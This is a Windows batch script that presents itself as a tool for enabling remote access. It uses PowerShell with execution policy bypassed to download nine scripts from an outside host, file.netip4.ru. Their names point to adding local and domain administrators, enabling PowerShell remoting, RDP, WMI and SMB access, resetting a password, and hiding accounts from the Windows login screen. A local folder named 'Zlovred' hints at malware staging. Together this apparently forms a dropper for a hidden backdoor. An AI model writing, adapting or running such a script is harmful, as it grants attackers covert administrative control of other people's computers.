@echo on
rem *******************************************************
rem nit-remoteenable-download.cmd
rem This Script will Download the Commands for Enabling 
rem Remote Access to Local Computer (with bitsadmin.exe)
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=RemoteOpen
set REDACT=
set FIRM=NIT
set PRODUCT_FOLDER_REMOTE=%FIRM%/%PRODUCT_NAME%/

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set Working Directory (may be Changed)
rem
rem set WorkingDir=%SystemRoot%
set WorkingDir=%UserProfile%

rem Set Host
rem
set aPrefix=http
set aDomain=file.netip4.ru
set aPort=80
set aRemoteDir=/PROGS/%PRODUCT_FOLDER_REMOTE%

set host=%aPrefix%://%aDomain%:%aPort%%aRemoteDir%

rem Download Payloads
rem

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%adAdminLocal.cmd -OutFile %WorkingDir%\adAdminLocal.cmd

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%adAdminDomain.cmd -OutFile %WorkingDir%\adAdminDomain.cmd 

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%nit-enable-PSremoting.bat -OutFile %WorkingDir%\nit-enable-PSremoting.bat

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%nit-enable-WMISMBFirewall.cmd -OutFile %WorkingDir%\nit-enable-WMISMBFirewall.cmd

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%Enable-RDPWindows.ps1 -OutFile %WorkingDir%\Enable-RDPWindows.ps1

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%reg_import_file.bat -OutFile %WorkingDir%\reg_import_file.bat

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%winlogon-SpecialAccounts.reg -OutFile %WorkingDir%\winlogon-SpecialAccounts.reg

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%adResetPassword.cmd -OutFile %WorkingDir%\adResetPassword.cmd

powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri %host%Set-AllPublicNetworksAsPrivate.ps1 -OutFile %WorkingDir%\Set-AllPublicNetworksAsPrivate.ps1

echo The End of the Script %0
exit /b 0

